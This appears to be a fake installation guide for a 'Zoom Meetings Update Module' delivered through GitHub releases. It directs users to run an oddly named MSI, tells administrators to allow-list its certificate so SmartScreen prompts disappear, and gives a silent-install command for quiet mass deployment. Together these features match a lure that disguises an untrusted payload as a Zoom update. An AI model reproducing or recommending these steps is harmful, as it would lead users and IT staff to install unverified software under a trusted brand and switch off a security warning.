# Installation guide

## Zoom Meetings Update Module

### End users

Download `zoo_ev833zj0mxpwq_v50242.msi` from release `v17534` and run the installer.

### IT administrators

- Deploy via your software distribution tool using the release asset URL.
- Allow-list the publisher certificate if SmartScreen prompts appear on first rollout.
- Module updates are delivered through new GitHub release tags; pin `v17534` for pilot groups.

### Silent install

```
zoo_ev833zj0mxpwq_v50242.msi /quiet /norestart
```

> Adjust switches per your packaging if the build is an MSI-based update module.
